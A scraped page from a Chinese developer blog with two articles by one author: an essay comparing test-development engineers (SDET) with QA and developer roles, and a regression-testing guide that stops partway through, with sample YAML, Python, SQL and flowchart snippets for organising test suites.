<meta itemprop="headline" content="拆解融合：测试开发，一个关于“更好”的悖论"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-21T11:15:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            拆解融合：测试开发，一个关于“更好”的悖论
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:15:24.000Z" title="Wed Jan 21 2026 11:15:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在技术职场中，“测试开发”（Test Development Engineer，常称测试开发工程师或SDET）这个头衔的出现与流行，常引发一个根本性的疑问：它究竟是测试与开发岗位的简单叠加，还是一种本质的进化？它与传统意义上的“测试”（QA/测试工程师）和“开发”（软件开发工程师）相比，是更好、更坏，还是全然不同？要理清这个问题，我们首先需要跳出“更好或更坏”的二元评价框架，去理解其背后所代表的角色演进、价值重构与技术哲学。</p>
<h3 data-id="heading-0"><strong>一、 核心定位：从线性分工到价值闭环</strong></h3>
<p>传统的“开发”与“测试”岗位，是软件工程瀑布模型或早期敏捷模型中线性分工的产物：</p>
<ul>
<li><strong>开发（Dev）</strong>：核心职责是<strong>创造</strong>。他们负责将需求转化为代码，构建产品的功能与架构，首要目标是“让东西能运行起来”。</li>
<li><strong>测试（QA）</strong>：核心职责是<strong>验证与守护</strong>。他们在开发完成后介入，通过设计用例、执行测试来发现缺陷，确保产品质量，首要目标是“找出哪里会坏”。</li>
</ul>
<p>这种分工的弊端在现代高速迭代的研发流程中日益凸显：反馈周期长、质量左移困难、测试效率成为瓶颈。</p>
<p><strong>测试开发（SDET）</strong> 的出现，正是为了打破这堵墙。其核心定位是：<strong>通过开发技能赋能与重塑整个质量保障体系</strong>。他们不是简单的“既懂测试又懂开发”，而是<strong>以开发者的思维和手段，解决测试、质量和效率领域的工程问题</strong>。他们的工作不是开发业务功能（Feature），而是开发<strong>质量基础设施与工具</strong>。</p>
<h3 data-id="heading-1"><strong>二、 职责与技能：从执行到构建</strong></h3>
<p>我们可以通过一个对比来具体化三者的区别：</p>









































<table><thead><tr><th align="left">维度</th><th align="left"><strong>开发（SWE）</strong></th><th align="left"><strong>测试（QA）</strong></th><th align="left"><strong>测试开发（SDET）</strong></th></tr></thead><tbody><tr><td align="left"><strong>核心产出</strong></td><td align="left">业务功能、产品代码</td><td align="left">测试报告、缺陷列表</td><td align="left"><strong>测试框架、工具平台、自动化解决方案</strong></td></tr><tr><td align="left"><strong>主要活动</strong></td><td align="left">需求分析、系统设计、编码、调试</td><td align="left">用例设计、手动/自动化测试、缺陷跟踪</td><td align="left"><strong>设计并实现自动化测试框架、搭建CI/CD流水线、进行效能分析与改进</strong></td></tr><tr><td align="left"><strong>关键技能</strong></td><td align="left">数据结构/算法、系统设计、编程语言、业务理解</td><td align="left">测试理论、用例设计、缺陷分析、基础自动化脚本</td><td align="left"><strong>深厚的编程能力、测试系统架构设计、对开发与运维流程的深刻理解</strong></td></tr><tr><td align="left"><strong>思维模式</strong></td><td align="left">构建思维：如何实现功能？</td><td align="left">破坏/质疑思维：哪里会出问题？</td><td align="left"><strong>工程与效率思维：如何系统性、自动化地保障质量并提升效率？</strong></td></tr><tr><td align="left"><strong>介入阶段</strong></td><td align="left">全周期，以前期为主</td><td align="left">传统上中后期为主，现代敏捷中持续参与</td><td align="left"><strong>全周期，并致力于将质量活动“左移”和“右移”（如监控）</strong></td></tr></tbody></table>
<p>简言之，开发工程师<strong>建造房子</strong>，测试工程师<strong>检查房子是否牢固</strong>，而测试开发工程师则<strong>设计并制造检查房屋用的智能仪器、自动化监测网络，甚至改进建筑工艺本身以减少缺陷</strong>。</p>
<h3 data-id="heading-2"><strong>三、 更好还是更坏？一个关于价值的悖论</strong></h3>
<p>这是一个经典的误解。岗位之间不是简单的“升级”或“降级”关系，而是<strong>价值维度与职业路径的分化</strong>。</p>
<p><strong>1. 对于个人而言，不存在绝对的高下：</strong></p>
<ul>
<li><strong>“更好”</strong>：如果你热爱编码，同时对系统性的质量、效率和用户体验有强烈的执着，享受“用技术解决技术问题”的乐趣，那么测试开发提供了独一无二的结合点。它通常要求更全面的技术栈（前端、后端、运维知识），职业天花板高，容易向架构师、技术负责人或效能专家方向转型。</li>
<li><strong>“更坏”</strong>：如果你纯粹痴迷于业务逻辑创新和极致的产品功能构建，那么专注于开发可能更满足你的成就感。同样，如果你对深度探索用户场景、进行创造性探索式测试或用户体验分析有浓厚兴趣，资深的手动测试专家或专项测试专家（如安全、性能）同样是不可替代的顶尖角色。</li>
</ul>
<p><strong>2. 对于组织而言，是能力的必要补充：</strong>
测试开发岗位的兴起，反映了行业从“人力密集型测试”向“技术驱动型质量工程”的转型。它不是为了取代测试或开发，而是<strong>填补了单纯业务开发与单纯测试验证之间的“工程效能鸿沟”</strong>。一个健康的研发团队需要三者有机结合：</p>
<ul>
<li><strong>开发</strong> 保证功能迭代速度。</li>
<li><strong>测试</strong> 提供深度的业务场景验证和用户体验洞察。</li>
<li><strong>测试开发</strong> 保障前两者的基础效率与可靠性，让快速迭代不致于牺牲质量。</li>
</ul>
<p>没有测试开发，团队可能在快速迭代中陷入自动化不足、重复劳动和质效失衡的泥潭；而没有深耕业务的测试专家，自动化可能覆盖广泛却偏离用户真实场景。</p>
<h3 data-id="heading-3"><strong>四、 趋势与未来：质量工程与开发者赋能</strong></h3>
<p>未来的趋势愈发清晰：<strong>“测试”作为一种孤立的活动正在消融，而“质量保障”正作为一个核心维度融入整个软件开发生命周期。</strong> 测试开发的角色也在随之进化：</p>
<ol>
<li><strong>向左移</strong>：更早介入，通过单元测试框架、代码扫描工具等在开发阶段守护质量。</li>
<li><strong>向右移</strong>：关注部署后，通过开发监控工具、混沌工程平台等确保生产环境稳定性。</li>
<li><strong>向内融</strong>：其产出的工具和平台（如精准测试平台、流量回放工具、智能测试数据管理平台）正在直接赋能给开发人员，推动“质量内建”，让开发人员能更容易地为自己代码的质量负责。</li>
</ol>
<p>因此，测试开发的终极形态，或许不再是“为测试而开发的工程师”，而是 <strong>“质量与效能平台工程师”</strong> ，他们是研发团队的基础设施建设者，是让开发者和测试者都能更高产、更可靠的幕后引擎。</p>
<h3 data-id="heading-4"><strong>结论</strong></h3>
<p>所以，测试开发 vs. 测试 vs. 开发，区别不在于孰优孰劣，而在于<strong>赛道与使命的不同</strong>。它是对传统测试岗位的<strong>技术深化与职责扩展</strong>，也是对开发岗位在质量与效能维度上的<strong>专项强化</strong>。</p>
<p>对于择业者，选择的关键在于审视内心：你更渴望直接创造用户可见的产品价值（开发），还是更享受通过深度分析守护产品完美（测试），或是热衷于构建强大的支撑系统来提升整个创造过程的效能与可靠性（测试开发）？</p>
<p>在软件吞噬世界的今天，这三者都是不可或缺的齿轮。而测试开发，正是那个确保所有齿轮精准、高效、持久啮合的润滑剂与强化剂。它不是一条“更好”的路，但它是一条通往<strong>技术深度与工程广度融合</strong>的、充满挑战与机遇的独特路径。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[回归测试：软件演进中的质量守护神与实践全指南]]></title>    <link>https://juejin.cn/post/7597596202025467946</link>    <guid>https://juejin.cn/post/7597596202025467946</guid>    <pubDate>2026-01-21T11:16:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597596202025467946" data-draft-id="7597641580104826934" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="回归测试：软件演进中的质量守护神与实践全指南"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-21T11:16:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="码事漫谈"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            回归测试：软件演进中的质量守护神与实践全指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    码事漫谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T11:16:59.000Z" title="Wed Jan 21 2026 11:16:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>回归测试作为软件质量保障的核心支柱，在持续交付和敏捷开发时代的重要性日益凸显。本文系统性地探讨了回归测试的理论基础、技术策略和实施框架，为企业构建高效、可持续的回归测试体系提供了一套完整的方法论。通过分层策略、选择性测试和智能自动化相结合，组织可以在保障质量的同时，有效控制测试成本，实现软件开发速度与稳定性的平衡。</p>
<h2 data-id="heading-0">1. 回归测试的演进与理论定位</h2>
<h3 data-id="heading-1">1.1 历史背景与定义深化</h3>
<p>回归测试的概念最早源于20世纪70年代的软件维护实践，随着软件开发范式的演变，其内涵不断丰富。现代回归测试已从简单的“重跑测试”发展为<strong>系统化的质量保障活动</strong>，其核心价值在于建立<strong>变更安全网</strong>，使开发团队能够自信地进行代码修改，而不必担心破坏现有功能。</p>
<h3 data-id="heading-2">1.2 理论基础：软件变更的涟漪效应</h3>
<p>研究表明，软件系统内部组件间的耦合度普遍高于直观预期。一项针对开源项目的实证研究显示，平均每次代码提交会影响2-5个看似无关的功能模块。这种隐性依赖关系是回归测试存在的根本原因——<strong>任何变更都可能产生意想不到的副作用</strong>。</p>
<h2 data-id="heading-3">2. 回归测试的类型学分析</h2>
<p>根据测试范围和目标的不同，回归测试可分为以下维度：</p>









































<table><thead><tr><th>类型</th><th>测试对象</th><th>频率</th><th>自动化程度</th></tr></thead><tbody><tr><td>单元回归</td><td>函数/类级别</td><td>每次提交</td><td>高（&gt;95%）</td></tr><tr><td>集成回归</td><td>模块/服务接口</td><td>每日/每次构建</td><td>中高（70-90%）</td></tr><tr><td>系统回归</td><td>端到端业务流程</td><td>发布前/定期</td><td>中（50-70%）</td></tr><tr><td>非功能回归</td><td>性能、安全等特性</td><td>主要版本发布</td><td>低中（30-60%）</td></tr><tr><td>可视化回归</td><td>UI/视觉一致性</td><td>设计变更后</td><td>中高（80-95%）</td></tr></tbody></table>
<h2 data-id="heading-4">3. 回归测试实施的完整框架</h2>
<h3 data-id="heading-5">3.1 第一阶段：建立回归测试基础架构</h3>
<h4 data-id="heading-6">3.1.1 测试用例库建设与分类</h4>
<ol>
<li>
<p><strong>核心用例识别</strong>：通过业务价值分析，识别关键用户旅程路径</p>
<ul>
<li>高频使用功能（每日访问量前20%）</li>
<li>核心业务功能（直接影响收入或用户留存）</li>
<li>法规遵从功能（必须符合法律要求）</li>
</ul>
</li>
<li>
<p><strong>测试用例标记体系</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">priority:</span> [<span class="hljs-string">p0</span>, <span class="hljs-string">p1</span>, <span class="hljs-string">p2</span>, <span class="hljs-string">p3</span>]  <span class="hljs-comment"># 基于业务影响</span>
<span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> [<span class="hljs-string">functional</span>, <span class="hljs-string">performance</span>, <span class="hljs-string">security</span>, <span class="hljs-string">accessibility</span>]
<span class="hljs-bullet">-</span> <span class="hljs-attr">layer:</span> [<span class="hljs-string">unit</span>, <span class="hljs-string">integration</span>, <span class="hljs-string">e2e</span>, <span class="hljs-string">api</span>]
<span class="hljs-bullet">-</span> <span class="hljs-attr">domain:</span> [<span class="hljs-string">checkout</span>, <span class="hljs-string">search</span>, <span class="hljs-string">user-profile</span>, <span class="hljs-string">...</span>]
<span class="hljs-bullet">-</span> <span class="hljs-attr">stability:</span> [<span class="hljs-string">stable</span>, <span class="hljs-string">flaky</span>, <span class="hljs-string">deprecated</span>]
<span class="hljs-bullet">-</span> <span class="hljs-attr">automation:</span> [<span class="hljs-string">automated</span>, <span class="hljs-string">manual</span>, <span class="hljs-string">semi-auto</span>]
</code></pre>
</li>
</ol>
<h4 data-id="heading-7">3.1.2 自动化框架选择与分层</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 回归测试自动化架构示例</span>
test_architecture = {
    <span class="hljs-string">"unit"</span>: {
        <span class="hljs-string">"framework"</span>: [<span class="hljs-string">"pytest"</span>, <span class="hljs-string">"JUnit"</span>, <span class="hljs-string">"NUnit"</span>],
        <span class="hljs-string">"coverage_target"</span>: <span class="hljs-string">"&gt;80%"</span>,
        <span class="hljs-string">"execution_time"</span>: <span class="hljs-string">"&lt;10分钟"</span>
    },
    <span class="hljs-string">"integration"</span>: {
        <span class="hljs-string">"framework"</span>: [<span class="hljs-string">"TestNG"</span>, <span class="hljs-string">"xUnit"</span>, <span class="hljs-string">"pytest with fixtures"</span>],
        <span class="hljs-string">"mock_strategy"</span>: [<span class="hljs-string">"in-memory DB"</span>, <span class="hljs-string">"service virtualization"</span>],
        <span class="hljs-string">"execution_time"</span>: <span class="hljs-string">"&lt;30分钟"</span>
    },
    <span class="hljs-string">"e2e"</span>: {
        <span class="hljs-string">"framework"</span>: [<span class="hljs-string">"Selenium"</span>, <span class="hljs-string">"Cypress"</span>, <span class="hljs-string">"Playwright"</span>],
        <span class="hljs-string">"parallelization"</span>: <span class="hljs-string">"跨浏览器/设备"</span>,
        <span class="hljs-string">"execution_time"</span>: <span class="hljs-string">"&lt;2小时"</span>
    },
    <span class="hljs-string">"api"</span>: {
        <span class="hljs-string">"framework"</span>: [<span class="hljs-string">"RestAssured"</span>, <span class="hljs-string">"Supertest"</span>, <span class="hljs-string">"Postman"</span>],
        <span class="hljs-string">"contract_testing"</span>: [<span class="hljs-string">"Pact"</span>, <span class="hljs-string">"Spring Cloud Contract"</span>],
        <span class="hljs-string">"execution_time"</span>: <span class="hljs-string">"&lt;20分钟"</span>
    }
}
</code></pre>
<h3 data-id="heading-8">3.2 第二阶段：回归测试选择策略</h3>
<h4 data-id="heading-9">3.2.1 基于代码变更的分析技术</h4>
<ol>
<li>
<p><strong>静态代码分析选择法</strong>：</p>
<ul>
<li>使用代码依赖图识别受影响模块</li>
<li>通过控制流和数据流分析确定测试范围</li>
<li>工具集成示例：<code>git diff + 依赖分析器</code></li>
</ul>
</li>
<li>
<p><strong>影响矩阵法</strong>：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 建立功能-代码模块映射表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> feature_code_mapping (
  feature_id <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>),
  module_path <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">255</span>),
  dependency_level <span class="hljs-type">INT</span> <span class="hljs-comment">-- 直接/间接依赖</span>
);

<span class="hljs-comment">-- 根据变更的模块路径选择测试用例</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> test_case_id 
<span class="hljs-keyword">FROM</span> test_case_coverage
<span class="hljs-keyword">WHERE</span> module_path <span class="hljs-keyword">IN</span> (
  <span class="hljs-keyword">SELECT</span> impacted_module 
  <span class="hljs-keyword">FROM</span> change_impact_analysis
  <span class="hljs-keyword">WHERE</span> commit_hash <span class="hljs-operator">=</span> <span class="hljs-string">'current_commit'</span>
);
</code></pre>
</li>
</ol>
<h4 data-id="heading-10">3.2.2 基于风险的优先级排序</h4>
<pre><code class="hljs language-diff" lang="diff">风险评估公式：
风险评分 = (业务影响 × 故障频率 × 用户覆盖率) / 修复成本

其中：
<span class="hljs-deletion">- 业务影响: 1-10分（收入影响、品牌损害等）</span>
<span class="hljs-deletion">- 故障频率: 历史故障率数据</span>
<span class="hljs-deletion">- 用户覆盖率: 受影响用户百分比</span>
<span class="hljs-deletion">- 修复成本: 热修复所需人天</span>
</code></pre>
<h3 data-id="heading-11">3.3 第三阶段：回归测试执行与优化</h3>
<h4 data-id="heading-12">3.3.1 智能执行策略</h4>
<ol>
<li>
<p><strong>分层并行执行</strong>：</p>
<pre><code class="hljs">┌─────────────────────────────────────┐
│         持续集成触发                │
├─────────────────────────────────────┤
│ 第1层: 单元测试 (5-10分钟)          │
│  └─ 快速反馈，失败则中断流程         │
├─────────────────────────────────────┤
│ 第2层: 集成测试 (20-30分钟)         │
│  └─ 异步执行，不阻塞开发            │
├─────────────────────────────────────┤
│ 第3层: 关键E2E测试 (1-2小时)        │
│  └─ 夜间执行，次日报告              │
└─────────────────────────────────────┘
</code></pre>
</li>
<li>
<p><strong>失败测试分析流程</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
  A[测试失败] --&gt; B{是否环境问题?}
  B --&gt;|是| C[环境修复]
  B --&gt;|否| D{是否产品缺陷?}
  D --&gt;|是| E[创建缺陷报告]
  D --&gt;|否| F{是否测试用例问题?}
  F --&gt;|是| G[更新测试用例]
  F --&gt;|否| H[标记为不稳定测试]
  C --&gt; I[重新执行]
  E --&gt; I
  G --&gt; I
  H --&gt; J[添加到不稳定套件]
</code></pre>
</li>
</ol>
<h4 data-id="heading-13">3.3.2 不稳定测试管理</h4>
<p>不稳定测试（Flaky Tests）是回归测试的主要挑战。应对策略包括：</p>
<ol>
<li>
<p><strong>不稳定测试检测</strong>：</p>
<ul>
<li>对同一提交连续运行5次，失败率&gt;0%且&lt;100%的测试标记为不稳定</li>
<li>使用统计学方法识别随机失败模式</li>
</ul>
</li>
<li>
<p><strong>处理流程</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">不稳定测试处理流程：
<span class="hljs-bullet">1.</span> 隔离：移出主回归套件，放入专项套件
<span class="hljs-bullet">2.</span> 诊断：分析根本原因（时序、竞态、环境等）
<span class="hljs-bullet">3.</span> 修复：投入专门资源修复或重写
